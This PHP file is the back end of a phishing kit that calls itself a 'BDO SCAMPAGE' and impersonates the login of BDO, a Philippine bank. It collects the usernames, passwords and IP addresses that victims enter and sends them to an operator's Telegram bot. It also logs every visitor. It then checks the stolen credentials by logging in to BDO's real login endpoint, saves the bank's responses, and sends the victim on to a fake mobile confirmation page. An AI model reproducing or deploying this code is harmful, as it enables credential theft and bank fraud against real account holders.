<?php
include("settings/config.php");
date_default_timezone_set('Asia/Manila');


function generateRandomString($length) {
    $include_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    /* Uncomment below to include symbols */
    /* $include_chars .= "[{(!@#$%^/&*_+;?\:)}]"; */
    $charLength = strlen($include_chars);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $include_chars [rand(0, $charLength - 1)];
    }
    return $randomString;
}
 
// Call function
$lenght = 200; # Set result string lenght
$codebash = generateRandomString($lenght);

error_reporting(0);
   function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

  $username = $_POST['channelUserID'];
$password = $_POST['channelPswdPin'];


    if(isset($_POST['submit'])){

if($truelog == 'no'){
$request_params = [
            "chat_id" => $user_id,
            "text" => "[BDO SCAMPAGE] \n\n [+] TrueLog: No\n[+] USERNAME: ".$username."\n[+] Password: ".$password."\n[+] IP: ".$_SERVER['REMOTE_ADDR']
        ];
       # $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
        file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params));
    die(header("location: ../mobileconfirmation?auth=$codebash"));
}else{
if(truelogcheck($username, $password) == 'VALID'){
    
$request_params = [
            "chat_id" => $user_id,
            "text" => "[BDO SCAMPAGE] \n\n [+] TrueLog: Yes \n[+] USERNAME: ".$username."\n[+] Password: ".$password."\n[+] IP: ".$_SERVER['REMOTE_ADDR']
        ];
        $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
        file_get_contents($request_url);

    die(header("location: ../mobileconfirmation?auth=$codebash"));
}else{
 $request_params = [
            "chat_id" => $user_id,
            "text" => "[BDO SCAMPAGE] \n\n [+] TrueLog: Yes | Not Valid Log\n[+] USERNAME: ".$username."\n[+] Password: ".$password."\n[+] IP: ".$_SERVER['REMOTE_ADDR']
        ];
        $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
        file_get_contents($request_url);
header("location: ../login?/wicket:interface/:30:loginUnifiedPanel:loginForm::IFormSubmitListener::=1");
}

}

}
$request_params = [
            "chat_id" => $user_id,
            "text" => "[BDO SCAMPAGE] \n\n [+] VISITOR: ".$_SERVER["REMOTE_ADDR"]."\n[+] DATE: ".date("M d, Y - h:i:s A")
        ];
        $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
 file_get_contents($request_url);

function truelogcheck($username, $password){
    $ck = './COOKIES/cookiesmoto'.rand(0, 10000).'.txt';

        $hex1 = substr(str_shuffle(str_repeat('abcdef1234567890', 4)), 0, 4);
        $hex2 = substr(str_shuffle(str_repeat('abcdef1234567890', 4)), 0, 4);
        $hex3 = substr(str_shuffle(str_repeat('abcdef1234567890', 4)), 0, 4);
        
        $hex             = $hex1 . "-" . $hex2 . "-" . $hex3;

/////////////////////////////////////////////

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.bdo.com.ph/generic/login/bdosecuritiesIPMS');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'GZIP, DEFLATE, BR');
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
    curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36');
        curl_setopt($ch, CURLOPT_COOKIEJAR, $ck);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $ck);
  $sc = curl_exec($ch);
    curl_close($ch);

$loc = explode(PHP_EOL, explode('Location: ', $sc)[1])[0];
$ses = 'SSESS6'.explode(';', explode('Set-Cookie: SSESS6', $sc)[1])[0];


#echo 'LOC: '.$loc.PHP_EOL;
#echo 'SES: '.$ses.PHP_EOL;

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $loc);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'GZIP, DEFLATE, BR');
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
    curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36');
        curl_setopt($ch, CURLOPT_COOKIEJAR, $ck);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $ck);
   $sc2 = curl_exec($ch);
    curl_close($ch);

$sid = 'JSESSIONID'.explode(';', explode('Set-Cookie: JSESSIONID', $sc2)[1])[0];

  # echo 'SID: '.$sid.PHP_EOL; 


$h1 = array();
$h1[] = 'Host: www.login.bdo.com.ph';
$h1[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$h1[] = 'Origin: https://www.login.bdo.com.ph';
$h1[] = 'User-Agent: Mozilla/5.0 (Linux; Android 5.1; Samsung Galaxy S6 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36-iPMS Android App';
$h1[] = 'Content-Type: application/x-www-form-urlencoded';
$h1[] = 'Referer: '.$loc;
$h1[] = 'Accept-Encoding: gzip, deflate';
$h1[] = 'Accept-Language: en-US';
$h1[] = 'Cookie: '.$sid.'; '.$ses.';';
$h1[] = 'X-Requested-With: com.intellect.bdoMobile';

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.login.bdo.com.ph/onlinelogin/validateLogin.do');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'GZIP, DEFLATE, BR');
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $h1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $ck);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $ck);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'app_code=bsc_ipms&refNo=&backURL=https%3A%2F%2Fwww.bdo.com.ph%2Fsecurities%2Fhome&j_username='.$username.'&j_password='.$password);
   $x = curl_exec($ch);
    curl_close($ch);


if(strpos($x, 'href="https://www.login.bdo.com.ph/onlinelogin/displayOTP.do?app_code=bsc_ipms"')){
    $rr =  'VALID';
}elseif(Strpos($x, 'Your password has expired. Please access BDO Online Banking to update your password.')){
$rr =  'VALID';
}else{
    $rr = 'INVALID';
}


    $fp = fopen("tllogs.txt", "a");
fputs($fp, "TRUELOGIN MESSAGE: $x \n\n\n");

    return $rr;
}

function xr($url, $body = 0,  $rm = 0, $header = 0, $cookie = 0, $encoding)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
    if ($encoding) {
        curl_setopt($ch, CURLOPT_ENCODING, $encoding);
    }    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    if ($rm) {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $rm);
    }   
    curl_setopt($ch, CURLOPT_HEADER, 1);
    if ($header) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }
    if ($cookie) {
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    }
    if ($body) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    }
    $x = curl_exec($ch);
    curl_close($ch);
    return $x;
}



function T($i, $l, $y){
return explode($y, explode($l, $i)[1])[0];
}


?>